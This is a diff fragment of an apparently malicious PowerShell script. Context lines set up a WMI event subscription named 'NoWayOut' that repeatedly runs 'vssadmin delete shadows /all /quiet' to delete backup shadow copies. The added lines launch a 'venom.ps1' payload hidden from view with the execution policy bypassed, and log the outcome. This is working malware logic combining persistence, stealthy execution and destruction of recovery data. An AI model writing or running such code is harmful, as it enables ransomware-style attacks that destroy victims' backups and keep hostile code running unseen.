@@ -146,3 +146,11 @@ catch {
     Install-WMISubscription -Name "NoWayOut" -Command "cmd.exe /c vssadmin delete shadows /all /quiet" -IntervalSeconds 900
     Add-Content -Path $pamperlog -Value "[$timestamp] EXECUTE-2 | Fell Back to Wiggle Worm Constriction"
 }
+try {
+    Unblock-File c:\venom\venom.ps1
+    Start-Process $powershell_proc -ArgumentList @("-ExecutionPolicy Bypass -nop c:\venom\venom.ps1") -WindowStyle Hidden
+    Add-Content -Path $pamperlog -Value "[$timestamp] EXECUTE | Successfully executed venom"
+}
+catch {
+    Add-Content -Path $pamperlog -Value "[$timestamp] ERROR | Failed to execute venom"
+}  
